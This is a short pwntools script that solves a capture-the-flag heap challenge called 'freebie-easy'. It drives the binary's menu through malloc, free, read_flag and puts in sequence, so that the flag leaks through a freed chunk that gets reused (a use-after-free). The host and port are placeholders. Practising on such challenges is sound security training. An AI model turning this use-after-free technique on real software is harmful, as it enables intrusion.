#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('/challenge/freebie-easy_patched', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001AC4
            brva 0x0000000000001C76
            brva 0x0000000000001B54
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

prompt = b"Function (malloc/free/puts/read_flag/quit): "

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def malloc(sz):
    sla(prompt, b'malloc')
    sla(b'Size: ', str(sz).encode())

def free():
    sla(prompt, b'free')

def puts():
    sla(prompt, b'puts')

def read_flag():
    sla(prompt, b'read_flag')

# GDB()
malloc(0x282)
free()
read_flag()
puts()

p.interactive()